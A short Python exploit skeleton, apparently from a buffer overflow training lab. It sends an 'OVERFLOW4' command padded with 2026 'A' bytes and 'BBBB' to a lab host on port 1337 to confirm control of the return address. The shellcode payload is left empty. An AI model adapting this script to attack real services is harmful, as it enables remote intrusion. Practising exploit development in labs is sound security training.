import socket

ip = "10.10.180.18"
port = 1337

prefix = "OVERFLOW4 "
offset = 2026
overflow = "A" * offset
retn = "B" *4
padding = ""
payload = "" 
postfix = ""
buffer = prefix + overflow + retn + padding + payload + postfix
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  print("Is the B In The Place?")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

